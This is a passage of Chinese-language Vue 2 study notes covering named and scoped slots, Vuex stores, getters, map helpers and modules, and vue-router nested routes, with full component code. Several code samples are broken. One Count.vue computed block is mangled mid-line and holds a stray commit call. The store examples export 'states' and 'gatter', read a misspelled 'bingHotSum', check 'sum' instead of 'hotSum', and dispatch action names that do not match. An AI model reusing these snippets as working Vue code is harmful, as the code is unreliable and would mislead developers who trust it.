      	<img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
      </Category>
      
      <Category  title="游戏" >
      	<ul>
            <li v-for="(item, index) in games" :key="index">{{ item }}</li>
        </ul>
      </Category>
      
      <Category  title="电影" >
      	<video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
      </Category>
  </div>
</template>

<script>
import Category from './components/Category.vue'

export default {
  name: 'App',
  components: { Category },
  data() {
    return {
      foods: ['卤蛋', '荷包蛋', '水煮蛋', '茶叶蛋'],
      games: ['我的世界', '饥荒', '泰拉瑞亚', '神庙逃亡'],
      films: ['《穿靴子的猫》', '《后天》', '《Hello World》', '《2012》']
    }
  }
}
</script>

<style scoped>
.container {
  display: flex;
  justify-content: space-around;
}
</style>
```



------

## 具名插槽

### Category.vue (挖坑)

```html
<template>
    <div class="category">
         <h3>{{ title }}分类</h3>
         <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
		<slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会显示在浏览器上1</slot>
		<slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会显示在浏览器上2</slot>
    </div>
</template>

<script>
export default {
    name: 'Category',
    props: ['title'],
    
}
</script>

<style scoped>
.category {
    background-color: skyblue;
    width: 200px;
    height: 300px;
}
h3 {
    text-align: center;
    background-color: orange;
}
video {
    width: 100%;
}
img {
    width: 100%;
}
</style>
```

### App.vue (填坑)

```html
<template>
  <div class="container">
    <Category title="美食" >
		<img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
		<a slot="footer" href="http://www.atguigu.com">更多美食</a>
    </Category>
      
    <Category title="游戏" >
			<ul slot="center">
				<li v-for="(g,index) in games" :key="index">{{g}}</li>
			</ul>
			<div class="foot" slot="footer">
				<a href="http://www.atguigu.com">单机游戏</a><br>
				<a href="http://www.atguigu.com">网络游戏</a>
			</div>
	</Category>
      
    <Category title="电影">
		<video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
        <!-- 使用template的·新写法，v-slot: -->
		<template v-slot:footer>
			<div class="foot">
				<a href="http://www.baidu.com">经典</a>
				<a href="http://www.baidu.com">热门</a>
				<a href="http://www.baidu.com">推荐</a>
			</div>
			<h4>欢迎前来观影</h4>
		</template>
	</Category>
  </div>
</template>

<script>
import Category from './components/Category.vue'

export default {
  name: 'App',
  components: { Category },
  data() {
    return {
      foods: ['卤蛋', '荷包蛋', '水煮蛋', '茶叶蛋'],
      games: ['我的世界', '饥荒', '泰拉瑞亚', '神庙逃亡'],
      films: ['《穿靴子的猫》', '《后天》', '《Hello World》', '《2012》']
    }
  }
}
</script>

<style scoped>
.container {
  display: flex;
  justify-content: space-around;
}
</style>
```



------

## 作用域插槽

### Category.vue

```html
<template>
    <div class="category">
        <h3>{{ title }}分类</h3>
        <!-- foods传给使用者 -->
        <slot :foods="foods" msg="其它">默认内容</slot>
    </div>
</template>

<script>
export default {
    name: 'Category',
    props: ['title'],
    data() {
    	return {
            foods: ['卤蛋', '荷包蛋', '水煮蛋', '茶叶蛋']
    	}
  }
}
</script>

<style scoped>
.category {
    background-color: skyblue;
    width: 200px;
    height: 300px;
}
h3 {
    text-align: center;
    background-color: orange;
}
video {
    width: 100%;
}
img {
    width: 100%;
}
</style>
```

### App.vue

```html
<template>
  <div class="container">
      <Category  title="美食" >
          <!-- 必须用template，scope收到的是一个对象，对象名为foods，属性值有各种蛋 -->
          <template scope="food">
          	<ul>
            	<li v-for="(item, index) in food.foods" :key="index">{{ item }}</li>
        	</ul>
          </template>
      </Category>
      
      <!-- scope接收其它东西：msg -->
      <Category  title="美食" >
          <template scope="food">
          	<ol>
            	<li v-for="(item, index) in food.foods" :key="index">{{ item }}</li>
        	</ol>
              <h4>{{food.msg}}</h4>
          </template>
      </Category>
      
      <!-- 解构赋值 -->
      <Category  title="美食" >
      	<template scope="{foods}">
            	<h4 v-for="(item, index) in foods" :key="index">{{ item }}</h4>
        </template>
        <h4>{{ food.msg }}</h4>
      </Category>
      
      <!-- scope其它写法slot-scope="{food}" -->
      <Category  title="美食" >
      	<template slot-scope="{foods}">
            	<h4 v-for="(item, index) in foods" :key="index">{{ item }}</h4>
        </template>
        <!--<h4>{{ food.msg }}</h4>-->
      </Category>
  </div>
</template>

<script>
import Category from './components/Category.vue'

export default {
  name: 'App',
  components: { Category }
}
</script>

<style scoped>
.container {
  display: flex;
  justify-content: space-around;
}
</style>
```

------

# Vuex-状态管理

## Vuex

​		Vuex 是一个专为 Vue.js 应用程序开发的**状态管理模式**。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。

### 环境准备

1. npm i vuex@3 (npm i vuex默认vuex4，只能vue3用)

2. 引入并使用vuex。

3. 创建vuex核心store。

4. 创建并暴露store（**必须先应用Vuex插件，才能创建store**）

    src/vuex/store.js或src/store/index.js (官网写法)

### **什么时候使用Vuex?**

Vuex **可以帮助我们管理共享状态**，并附带了更多的概念和框架。这需要对短期和长期效益进行权衡。

1. 多个视图依赖于同一状态。（都要获取当前的x值）
2. 来自不同视图的行为需要变更同一状态。（A点击修改x=412，B滑动修改x=412......）

### 什么是状态管理模式？

- **state**，驱动应用的数据源；
- **view**，以声明方式将 **state** 映射到视图；
- **actions**，响应在 **view** 上的用户输入导致的状态变化。![image-20230402144351872](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230402144351872.png)

> ——>【State】				 			——> data{ hot:1 }
> ——>render				 	 			——> 渲染显示hot
> ——>Vue Components 				——> Vue求和组件
> ——>dispatch 				  			——> 派遣发送 dispatch ( ' hotSum', 2)
> ——>【Actions】(Backend API)   ——> {... hotSum: function...}			——> 可以跳过直接Mutations
> ——>commit 								——> 提交commit( 'hotSum' , 2)
> ——>【Mutations】(Devtools)     ——> 加工修改维护{... hotSum: function(state,2)...}——> 开发工具
> ——>Mutate 								——> 
> ——>【State】

```javascript
new Vue({
  // -------------state
  data () {
    return { count: 0 }
  },
  // -------------view
  template: `<div>{{ count }}</div>`,
  // -------------actions
  methods: {
    increment () { this.count++ }
  }
})
```

## 求和实例

### vue的method实现

#### Count.vue

```html
<template>
  <div>
    <h1>当前hot为：{{ hotSum }}</h1>
    <select v-model.number="n">
    		<option value="1">1</option>
    		<option value="2">2</option>
    		<option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
    name:'Count',
    data(){
        return {
            n:1,
            hotSum:1
        }
    },
    methods:{
        increment() {
            this.hotSum += this.n
        },
        decrement() {
            this.hotSum -= this.n
        },
        incrementOdd() {
            if (this.hotSum % 2) {
                this.hotSum += this.n
            }else{
                alert('当前为偶数')
            }
        },
        incrementWait() {
            setTimeout(() => {
                this.hotSum += this.n
            }, 500)
        },
    }
}
</script>

<style>
button,select{
		float: left;
		margin: 10px;
	}
</style>
```

App.vue

```html
<template>
	<div>
		<Count/>
	</div>
</template>

<script>
	import Count from './components/Count'
	export default {
		name:'App',
		components:{Count},
		mounted() {
			// console.log('App',this)
		},
	}
</script>
```



------

### Vuex实现

#### 环境准备

1. npm i vuex@3 (npm i vuex默认vuex4，只能vue3用)

2. 引入并使用vuex。

3. 创建vuex核心store。

4. 创建并暴露store（**必须先应用Vuex插件，才能创建store**）

   src/vuex/store.js或src/store/index.js (官网写法)

```javascript
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件（必须先应用Vuex插件，才能创建store）
Vue.use(Vuex) 
// 创建vuex核心store。
const actions = {} // 用于响应组件中的动作
const mutations = {} // 用于操作数据
const state = {} // 用于存储数据
const getters = {} // 用于数据加工【可选】
// 创建并暴露store
export default new Vuex.Store({
    actions:actions,
    mutations,
    states,
})
```

5. main.js 引入store。

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import vueResource from 'vue-resource'
//引入store
import store from './store/index.js'

//关闭Vue的生产提示
Vue.config.productionTip = false
//使用插件
Vue.use(vueResource) 

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store,
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

------

#### vuex实现

1. 共享data转移到【state】。====（hotSum）
2. 【VueComponents】调用dispatch派遣发送到【actions】 。==== this.$store.dispatch('JIA',this.n)
3. 【actions】里调用commit提交给【mutations】。==== context.commit('JIA',value)
4. 【mutations】里操作数据，实现业务。==== JIA (state,value) { state.sum += value }
5. 【state】跟新后render重新渲染组件。

备注：【mutations】里操作数据函数一般用全大写。

##### Count.vue

```html
<template>
  <div>
    <h1>当前hot为：{{$store.getters.hotSum}}</h1>
    <select v-model.number="n">
    	<option value="1">1</option>
    	<option value="2">2</option>
    	<option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
    name:'Count',
    data(){
        return {
            n:1, // 选择数据
        }
    },
    methods:{
        increment() {
       		this.$store.dispatch('JIA',this.n)
        },
        decrement() {
            // 跳过派遣发送dispatch阶段，直接进入actions里调用commit
			this.$store.commit('JIAN',this.n)
        },
        incrementOdd() {
			this.$store.dispatch('jiaOdd',this.n)
        },
        incrementWait() {
           this.$store.dispatch('jiaWait',this.n)
        },
    }
}
</script>

<style>
button,select{
		float: left;
		margin: 10px;
	}
</style>
```

##### src/store/index.js 

```javascript
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = {
	 jia(context,value){
		console.log('actions中的jia被调用了')
		context.commit('JIA',value)
	},
	/*jian(context,value){
		console.log('actions中的jian被调用了')
		context.commit('JIAN',value)
	}, */
	jiaOdd(context,value){
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}else{
            console.log('当前为偶数')
        }
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
//准备mutations——用于操作数据（state）
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}
//准备state——用于存储数据
const state = {
	hotSum:0 //当前的和
}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```

------

### store [ getters ]

// 对数据进行加工，添加放大hotSum十倍功能

#### Count.vue

```html
<h3>当前求和放大10倍为：{{$store.getters.bigHotSum}}</h3>
```

#### src/store/index.js 

```javascript
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件（必须先应用Vuex插件，才能创建store）
Vue.use(Vuex) 

// 创建vuex核心store。
const actions = {......} // 用于响应组件中的动作
const mutations = {......} // 用于操作数据
const state = {......} // 用于存储数据

//准备【getters】——用于对state的数据进行加工
const getters = {
    bigHotSum(state){
        return state.bingHotSum*10
    }
}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
	gatter
})
```

## store代码优化

|              | 优化范围                                  |                                                              |
| ------------ | ----------------------------------------- | ------------------------------------------------------------ |
| mapState     | 插值语法引用<br />{{$store.state.hotSum}} | ...mapState({bighe:'bigHotSum'}),<br />...mapState ([ 'bigHotSum' ]) |
| mapGetters   | {{$store.getters.bigHotSum}}              | ...mapGetters({ hotSum: 'hotSum'}),<br />...mapGetters(['hotSum']) |
| mapMutations | this.$store.commit('JIAN',this.n)         | ...mapMutations({ decrement:'JIAN' }),<br />...mapMutations([ 'JIAN' ]), |
| mapActions   | this.$store.dispatch('JIA',this.n)        | ...mapActions({ increment:'jia', incrementWait:'jiaWait' }),<br />...mapActions([ 'jia','jiaWait' ]) |



### 1. mapState与mapGetters优化

解决store**在模板引用getters和state代码冗余问题**：

```html
<h3>当前求和放大10倍为：{{$store.getters.bigHotSum}}</h3>
<h3>当前求和为：{{$store.state.hotSum}}</h3>
......
```

#### computed实现

```html
<template>
	<h3>当前求和放大10倍为：{{bighe}}</h3>
	<h3>当前求和为：{{hotSum}}</h3>
......
</template>
<script>
......
computed:{
	bighe(){
    	return $store.getters.bigHotSum
	},
    hotSum(){
        return $store.state.hotSum
    }
}
......
</script>
<style></style>
```

#### 正经实现

借助mapState、mapGetters生成计算属性，使用state中的数据。

```html
<template>
	<h3>当前求和放大10倍为：{{bighe}}</h3>
	<h3>当前求和为：{{hotSum}}</h3>
......
</template>
<script>
	// 映射状态
	import {mapState,mapGetters} from 'vuex'
	......
	computed:{
        // 对象写法{ key模板引用，value映射state的值 }
		...mapState({bighe:'bigHotSum'}),
        // 数组写法
        // ...mapState ([ 'bigHotSum' ]) 
            
        //...mapGetters({ hotSum: 'hotSum'}),
        ...mapGetters(['hotSum'])
	}
	......
</script>
<style></style>
```

### 2. mapMutations与mapActions优化

解决store**在模板调用commit和dispatch代码冗余问题**：

```javascript
......
methods:{
    increment() {
        this.$store.dispatch('JIA',this.n)
    },
    decrement() {
        // 跳过派遣发送dispatch阶段，直接进入actions里调用commit
        this.$store.commit('JIAN',this.n)
    },
    incrementOdd() {
        this.$store.dispatch('jiaOdd',this.n)
    },
    incrementWait() {
        this.$store.dispatch('jiaWait',this.n)
    },
}
......
```

#### 正经解决

借用mapMutations、mapActions生成对应方法，方法中会调用commit去联系mutations

```html
<template>
  	<button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
</template>
<script>
	// 映射状态
	import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
	......
	methods:{
        // 解决commit,在html上传值
        ...mapMutations({ decrement:'JIAN' }),
        //...mapMutations([ 'JIAN' ]), // 模板修改为{{JIAN(n)}}
            
        // 解决dispatch,在html上传值
        ...mapActions({ increment:'jia', incrementOdd:'jiaOdd', incrementWait:'jiaWait' }),
        //...mapActions([ 'jia','jiaOdd','jiaWait' ])
    }
	......
</script>
<style></style>
```



------

## 多组件共享数据

### Count.vue

```html
<template>
    <div>
        <h1>当前hot为：{{ hotSum }}</h1>
        <h3>当前求和放大10倍为：{{ bigHotSum }}</h3>
        <select v-model.number="n">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="increment(n)">+</button>
        <button @click="decrement(n)">-</button>
        <button @click="incrementOdd(n)">当前求和为奇数再加</button>
        <button @click="incrementWait(n)">等一等再加</button>
    </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from 'vuex'
export default {
    name: 'Count',
    data() {
        return {
            n: 1, // 选择数据
        }
    },
    computed: {
   s.$store.commit('JIAN',this.n)
        ...mapMutations({ decrement: 'JIAN' }),
    }
}
</script>

<style>
button,
select {
    float: left;
    margin: 10px;
}
</style>
```

### Coumt2.vue

```html
<template>
    <div>
        <h2>当前hot为：{{ hotSum }}</h2>
        <h3>{{ singASong }}</h3>
        <input type="text"  placeholder="输入一首歌！" v-model="ASong">
      
        <button @click="addASong">添加</button>
        <ul>
            <li v-for="s in singerList" :key="s.id"> {{ s.singerName }}--{{ s.song }}</li>
        </ul>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
import { mapGetters, mapState} from 'vuex'
export default {
    name: 'Count2',
    data(){
        return{
            ASong:''
        }
    },
    computed: {
      /*   // $store.state.
        ...mapState(['hotSum','singerList']),
        // $store.gatters.
        ...mapGetters(['singASong']), */
        hotSum(){
            return this.$store.state.hotSum
        },
         singerList() {
            return this.$store.state.singerList
        },
        singASong() {
            return this.$store.getters.singASong
        }
    },
    methods: {
        addASong(){
            const singerObj = { id: nanoid(), singerName: '邓紫棋', song:this.ASong}
            this.$store.commit('ADD_SONG', singerObj)
            this.ASong = ''
        }
    },
}

</script>

<style>
button,
select {
    float: left;
    margin: 10px;
}
</style>
```



### src/store/index.js 

```javascript
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = {
    jia(context, value) {
        console.log('actions中的jia被调用了')
        context.commit('JIA', value)
    },
    /*jian(context,value){
        console.log('actions中的jian被调用了')
        context.commit('JIAN',value)
    }, */
    jiaOdd(context, value) {
        console.log('actions中的jiaOdd被调用了')
        if (context.state.sum % 2) {
            context.commit('JIA', value)
        } else {
            console.log('当前为偶数')
        }
    },
    jiaWait(context, value) {
        console.log('actions中的jiaWait被调用了')
        setTimeout(() => {
            context.commit('JIA', value)
        }, 500)
    }
}
//准备mutations——用于操作数据（state）
const mutations = {
    JIA(state, value) {
        state.hotSum += value
        console.log('mutations中的JIA被调用了' + value + state.hotSum)

    },
    JIAN(state, value) {
        console.log('mutations中的JIAN被调用了')
        state.hotSum -= value
    },
    ADD_SONG(state, value) {
        console.log('mutations中的ADD_PERSON被调用了')
        state.singerList.unshift(value)
    }
}
//准备state——用于存储数据
const state = {
    hotSum: 0,//当前的和
    singerList: [
        { id: 1, singerName: '邓紫棋', song: '偶尔' }
    ]
}

//准备【getters】——用于对state的数据进行加工
const getters = {
    bigHotSum(state) {
        return state.hotSum * 10
    },
    singASong(state) {
        return state.singerList[0].singerName + '唱' + state.singerList[0].song
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

### main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
// import vueResource from 'vue-resource'
//引入store
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false
//使用插件
// Vue.use(vueResource)

//创建vm
new Vue({
  el: '#root',
  render: h => h(App),
  store,
  // vueResource,
  beforeCreate() {
    Vue.prototype.$bus = this
  }
})

```

### App.vue

```html
<template>
  <div>
    <Count />
    <br><br>
    <Coumt2 />
  </div>
</template>

<script>
import Count from './components/Count'
import Coumt2 from './components/Coumt2'
export default {
  name: 'App',
  components: { Count,Coumt2 },
  mounted() {
    // console.log('App',this)
  },
}
</script>
```



------

## Vuex模块化

------

### 组件components

#### Count.vue

```html
<template>
    <div>
        <h1>当前hot为：{{ hotSum }}</h1>
        <h3>当前求和放大10倍为：{{ bigHotSum }}</h3>
        <select v-model.number="n">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="increment(n)">+</button>
        <button @click="decrement(n)">-</button>
        <button @click="incrementOdd(n)">当前求和为奇数再加</button>
        <button @click="incrementWait(n)">等一等再加</button>
        <span v-for="s in singerList" :key="s.id">{{ s.song }}</span>
    </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from 'vuex'
export default {
    name: 'Count',
    data() {
        return {
            n: 1, // 选择数据
        }
    },
    computed: {
        // $store.state.
        ...mapState('countAbout',['hotSum']),
        ...mapState('singerAbout', ['singerList']),
        // $store.getters.
        ...mapGetters('countAbout',['bigHotSum']),
    },
    methods: {
        // this.$store.dispatch('JIA',this.n) 【值必须是字符串】
        ...mapActions('countAbout',{ increment: 'jia', incrementOdd: 'jiaOdd', incrementWait: 'jiaWait' }),
        // this.$store.commit('JIAN',this.n)
        ...mapMutations('countAbout',{ decrement: 'JIAN' }),
    }
}
</script>

<style>
button,
select {
    float: left;
    margin: 10px;
}
</style>
```

#### Singer.vue

```html
<template>
    <div>
        <h2>当前hot为：{{ hotSum }}</h2>
        <h3>{{ singASong }}</h3>
        <input type="text"  placeholder="输入一首歌！" v-model="ASong">
        <button @click="addASong">添加</button>
        <button @click="addSong">添加一首歌</button>
        <button @click="addSingerServer">服务器添加一首歌</button>
        <h3 style="color:#0ee">{{ verse }}</h3>
        <ul>
            <li v-for="s in singerList" :key="s.id"> {{ s.singerName }}--{{ s.song }}</li>
        </ul>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
import { mapGetters, mapState} from 'vuex'
export default {
    name: 'Singer',
    data(){
        return{
            ASong:''
        }
    },
    computed: {
      /*   // $store.state.
        ...mapState(['hotSum','singerList']),
        // $store.gatters.
        ...mapGetters(['singASong']), */
        hotSum(){
            return this.$store.state.countAbout.hotSum
        },
         singerList() {
            return this.$store.state.singerAbout.singerList
        },
        singASong() {
            return this.$store.getters['singerAbout/singASong']
        },
        verse(){
            return this.$store.state.singerAbout.verseFromServer
        }

    },
    methods: {
        addASong(){
            const singerObj = { id: nanoid(), singerName: '邓紫棋', song:this.ASong}
            this.$store.commit('singerAbout/ADD_ASONG', singerObj)
            this.ASong = ''
        },
        addSong(){
            const singerObj = { id: nanoid(), singerName: '邓紫棋', song: '天空没有极限' }
            this.$store.dispatch('singerAbout/addsong', singerObj)
            this.ASong = ''
        },
        addSingerServer(){
            this.$store.dispatch('singerAbout/addSingerServer')
        }
    },
    
}

</script>

<style>
button,
select {
    float: left;
    margin: 10px;
}
</style>
```

#### App.vue

```html
<template>
  <div>
    <Count />
    <br><br>
    <Singer />
  </div>
</template>

<script>
import Count from './components/Count'
import Singer from './components/Singer'
export default {
  name: 'App',
  components: { Count, Singer },
  mounted() {
    console.log('App',this)
  },
}
</script>
```

------

### src/store/xxx.js

#### count.js

```javascript
// 求和配置
export default {
    // 命名空间
    namespaced: true,
    // 用于响应组件中的动作
    actions: {
        jia(context, value) {
            console.log('actions中的jia被调用了')
            context.commit('JIA', value)
        },
        /*jian(context,value){
            console.log('actions中的jian被调用了')
            context.commit('JIAN',value)
        }, */
        jiaOdd(context, value) {
            console.log('actions中的jiaOdd被调用了')
            if (context.state.sum % 2) {
                context.commit('JIA', value)
            } else {
                console.log('当前为偶数')
            }
        },
        jiaWait(context, value) {
            console.log('actions中的jiaWait被调用了')
            setTimeout(() => {
                context.commit('JIA', value)
            }, 500)
        }
    },
    // 用于操作数据
    mutations: {
        JIA(state, value) {
            state.hotSum += value
            console.log('mutations中的JIA被调用了' + value + state.hotSum)

        },
        JIAN(state, value) {
            console.log('mutations中的JIAN被调用了')
            state.hotSum -= value
        },
    },
    // 用于存储数据
    state: {
        hotSum: 0,//当前的和
    },
    // 用于数据加工【可选】
    getters: {
        bigHotSum(state) {
            return state.hotSum * 10
        },
    }
}
```

#### singer.js

```javascript
// 歌手配置
import axios from 'axios'
import { nanoid } from 'nanoid'
export default {
    // 命名空间
    namespaced: true,
    // 用于响应组件中的动作
    actions: {
        addsong(context, value) {
            console.log('actions中的addsong被调用了')
            context.commit('ADD_SONG', value)
        },
        addSingerServer(context) {
            axios.get('https://api.uixsj.cn/hitokoto/get?type=social').then(
                response => {
                    console.log('actions中的addSingerServer被调用了')
                    context.commit('Add_VERSEFROMSERVER', response.data)
                },
                error => {
                    alert(error.message)
                }
            )
        }
    },
    // 用于操作数据
    mutations: {
        ADD_ASONG(state, value) {
            console.log('mutations中的ADD_ASONG被调用了')
            state.singerList.unshift(value)
        },
        ADD_SONG(state, value) {
            console.log('mutations中的ADD_SONG被调用了')
            state.singerList.unshift(value)
        },
        Add_VERSEFROMSERVER(state, value) {
            console.log('mutations中的Add_VERSEFROMSERVER被调用了')
            state.verseFromServer = value
        }

    },
    // 用于存储数据
    state: {
        singerList: [
            { id: nanoid(), singerName: '邓紫棋', song: '偶尔' }
        ],
        verseFromServer: 'Life Is Wonderful!'
    },
    // 用于数据加工【可选】
    getters: {
        singASong(state) {
            return state.singerList[0].singerName + '唱' + state.singerList[0].song
        }
    }
}
```

#### index.js

```javascript
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)
//引入count
import countOptions from './count'
//引入singer
import singerOptions from './singer'
//创建并暴露store
export default new Vuex.Store({
    modules: {
        countAbout: countOptions,
        singerAbout: singerOptions
    }
})
```

------

### main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
// import vueResource from 'vue-resource'
//引入store
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false
//使用插件
// Vue.use(vueResource)

//创建vm
new Vue({
  el: '#root',
  render: h => h(App),
  store,
  // vueResource,
  beforeCreate() {
    Vue.prototype.$bus = this
  }
})

```

# Ruouter-路由

## 什么是路由？

## 基本使用

步骤

1. 安装 npm i vue-router@3 (默认4版本)并应用 Vue.use(VueRouter)。

2. 创建配置文件：router/index.js 。编写路由规则。

3. router-link替换a标签，href替换为to=“组件”，active-classs设置活动样式，router-view设置组件展示位置。

   

注意点：

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

### 路由组件pages/

#### BlueColor.vue

```html
<template>
  <h3>blue</h3>
</template>
<script>
export default {
    name:'BlueColor'
}
</script>
<style></style>
```

#### RedColor.vue

```html
<template>
  <h3>red</h3>
</template>
<script>
export default {
    name:'RedColor'
}
</script>
<style></style>
```

------

### 一般组件components/

#### Banner.vue

```html
<template>
  <div class="title">
    <h3>红 蓝 转 换</h3>
  </div>
</template>

<script>
export default {
    name:'Banner'
}
</script>

<style scoped>
 .title {
    height: 80px;
    text-align: center;
    line-height: 80px;
    color: #2f2d29;
}
</style>
```

------

### App.vue

```html
<template>
    <div id="tab">
        <Banner />
        <div class="typeColor">
            <div class="tap">
                <router-link active-class="a-active" to="BlueColor">蓝</router-link>
                <router-link active-class="a-active" to="RedColor">红</router-link>
            </div>
            <div class="content">
                <!-- 指定组件显示位置 -->
                <router-view></router-view>
            </div>
        </div>
    </div>
</template>

<script>
import Banner from './components/Banner.vue'
export default {
    name: 'App',
    components: { Banner }
}
</script>

<style>
* {
    margin: 0;
    padding: 0;
}

#tab {
    width: 500px;
    height: 400px;
    margin: 20px;
    border: #3a3737 solid 2px;
}

.typeColor {
    height: 314px;
    background-color: #f1eef8;

}

.tap {
    float: left;
    width: 20%;
    height: 80px;
    background-color: #f1eef8;
    vertical-align: middle;
}

.content {
    float: left;
    width: 80%;
    height: 80px;
    background-color: #f1eef8;
    padding: 10px;
    box-sizing: border-box;
}

a {
    display: block;
    height: 40px;
    text-align: center;
    line-height: 40px;
    color: rgb(37, 37, 36);
    text-decoration: none;
}


.a-active {
    color: white;
    background-color: rgb(32, 59, 45);
}
</style>
```

### main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入vue-router
import VueRotuer from 'vue-router'
//引入路由器
import router from './router'
//关闭Vue的生产提示
Vue.config.productionTip = false
// 应用router
Vue.use(VueRotuer)

//创建vm
new Vue({
  el: '#root',
  router,
  render: h => h(App),
})

```

### router/index.js

```javascript
import VueRouter from "vue-router";
import BlueColor from '../pages/BlueColor'
import RedColor from '../pages/RedColor'

export default new VueRouter({
    routes: [
        {
            path: '/BlueColor',
            component: BlueColor
        },
        {
            path: '/RedColor',
            component: RedColor
        }
    ]
})
```

------

## 嵌套(多级)路由

### 快速入门

```javascript

```

------

### 完整例子

#### components

##### Banner.vue

```html
<template>
  <div class="title">
    <h3>红 蓝 转 换</h3>
  </div>
</template>

<script>
export default {
    name:'Banner'
}
</script>

<style scoped>
 .title {
    height: 80px;
    text-align: center;
    line-height: 80px;
    color: #2f2d29;
}
</style>
```

------

#### pages或views

##### 	RedColor

```html
<template>
  <h3>red</h3>
</template>

<script>
export default {
    name:'RedColor'
}
</script>

<style>

</style>
```

##### BlueColor

```html
<template>
  <div>
    <h3>blue</h3>
    <!-- 第二部分 -->
    <div clas="colorMsg">
      <div class="color-changing-over">
        <router-link active-class="a-active" to="/bluecolor/colorother">颜色衍生</router-link>
        <router-link active-class="a-active" to="/bluecolor/colorverse">来一小曲</router-link>
      </div>
      <router-view></router-view>
    </div>
  </div>
</template>

<script>
export default {
  name: 'BlueColor',
  mounted() {
    console.log('blue挂载了')
  },
  beforeDestroy() {
    console.log('blue销毁了')
  },
}
</script>

<style scoped>
.colorMsg {
  position: relative;
  width: 400px;
}

.color-changing-over {
  height: 40px;
}

.color-changing-over a {
  display: inline-block;
  width: 49%;
}
</style>
```

##### ColorOther

```html
<template>
    <div class="colorList">
        <ul>
            <li>#EEEE0</li>
            <li>#EEE00</li>
            <li>#EE000</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: 'ColorOther'
}
</script>

<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}

li {
    color: #00eeee;
}
</style>
```

##### ColorVerse

```html
<template>
    <div class="colorList">
        <ul>
            <li>天空是蔚蓝色</li>
            <li>我和你走在蓝蓝的天空</li>
            <li>如果蓝天不拥有飞机</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: 'ColorVerse'
}
</script>

<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}

li {
    color: #00eeee;
}
</style>
```

#### router/index.js

1. 子路由用children：[{ }] 编写规则。
2. 子路由的path不用加 / 。
3. router-link标签的to属性引用子路由：to="/父path/子path"

```javascript
import VueRouter from "vue-router";
import BlueColor from '../pages/BlueColor'
import RedColor from '../pages/RedColor'
import ColorOther from '../pages/ColorOther'
import ColorVerse from '../pages/ColorVerse'


export default new VueRouter({
    routes: [
        {
            path: '/bluecolor',
            component: BlueColor,
            children: [
                {
                    path: 'ColorOther',
                    component: ColorOther
                },
                {
                    path: 'colorverse',
                    component: ColorVerse
                }
            ]
        },
        {
            path: '/redcolor',
            component: RedColor
        }
    ]
})
```

#### App.vue

```html
<template>
    <div id="tab">
        <Banner />
        <div class="typeColor">
            <div class="tap">
